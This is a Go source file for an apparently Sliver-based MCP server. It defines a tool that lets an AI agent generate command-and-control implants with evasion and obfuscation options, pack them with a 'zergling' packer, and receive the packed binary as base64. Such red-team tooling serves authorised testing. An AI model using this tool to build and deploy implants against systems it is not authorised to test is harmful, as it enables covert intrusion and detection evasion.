package mcp

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	mcpapi "github.com/mark3labs/mcp-go/mcp"
)

const (
	generatePackedImplantToolName = "generate_packed_implant"
)

type generatePackedImplantArgs struct {
	Name             string   `json:"name" jsonschema:"description=Name for the implant"`
	OS               string   `json:"os" jsonschema:"description=Target OS (windows/linux/darwin),required"`
	Arch             string   `json:"arch" jsonschema:"description=Target architecture (amd64/386/arm64),required"`
	IsBeacon         bool     `json:"is_beacon" jsonschema:"description=Generate as beacon"`
	BeaconInterval   int64    `json:"beacon_interval" jsonschema:"description=Beacon interval in nanoseconds"`
	BeaconJitter     int64    `json:"beacon_jitter" jsonschema:"description=Beacon jitter in nanoseconds"`
	C2URLs           []string `json:"c2_urls" jsonschema:"description=C2 URLs,required"`
	Format           int32    `json:"format" jsonschema:"description=Output format"`
	Debug            bool     `json:"debug" jsonschema:"description=Debug mode"`
	Evasion          bool     `json:"evasion" jsonschema:"description=Evasion features"`
	ObfuscateSymbols bool     `json:"obfuscate_symbols" jsonschema:"description=Obfuscate symbols"`
	IncludeMTLS      bool     `json:"include_mtls" jsonschema:"description=Include mTLS transport"`
	IncludeHTTP      bool     `json:"include_http" jsonschema:"description=Include HTTP transport"`
	IncludeWG        bool     `json:"include_wg" jsonschema:"description=Include WireGuard transport"`
	IncludeDNS       bool     `json:"include_dns" jsonschema:"description=Include DNS transport"`
	PackerArgs       []string `json:"packer_args" jsonschema:"description=Additional arguments for the zergling packer"`
}

func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	if s.ZerglingPath == "" {
		return mcpapi.NewToolResultError("zergling packer path not configured"), nil
	}

	var args generatePackedImplantArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	s.logToolCall(generatePackedImplantToolName, "", "")

	cfg := buildImplantConfig(args.OS, args.Arch, args.IsBeacon,
		args.BeaconInterval, args.BeaconJitter, args.C2URLs,
		args.Format, args.Debug, args.Evasion, args.ObfuscateSymbols,
		args.IncludeMTLS, args.IncludeHTTP, args.IncludeWG, args.IncludeDNS,
		"", 0, 0, "", "", "")

	genResp, err := s.Rpc.Generate(ctx, &clientpb.GenerateReq{
		Config: cfg,
		Name:   args.Name,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("implant generation failed", err), nil
	}
	if genResp.File == nil || len(genResp.File.Data) == 0 {
		return mcpapi.NewToolResultError("generation returned empty payload"), nil
	}

	tmpFile, err := os.CreateTemp("", "sliver-implant-*.bin")
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to create temp file", err), nil
	}
	tmpPath := tmpFile.Name()
	defer os.Remove(tmpPath)

	if _, err := tmpFile.Write(genResp.File.Data); err != nil {
		tmpFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to write implant", err), nil
	}
	tmpFile.Close()

	outPath := tmpPath + ".packed"
	cmdArgs := append([]string{"-i", tmpPath, "-o", outPath}, args.PackerArgs...)
	cmd := exec.CommandContext(ctx, s.ZerglingPath, cmdArgs...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("zergling packer failed: %v\n%s", err, string(output))), nil
	}
	defer os.Remove(outPath)

	packed, err := os.ReadFile(outPath)
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to read packed output", err), nil
	}

	type packedResult struct {
		ImplantName string `json:"implant_name"`
		Size        int    `json:"size"`
		PackedSize  int    `json:"packed_size"`
		Data        string `json:"data"`
	}

	return mcpapi.NewToolResultStructuredOnly(packedResult{
		ImplantName: genResp.ImplantName,
		Size:        len(genResp.File.Data),
		PackedSize:  len(packed),
		Data:        base64.StdEncoding.EncodeToString(packed),
	}), nil
}
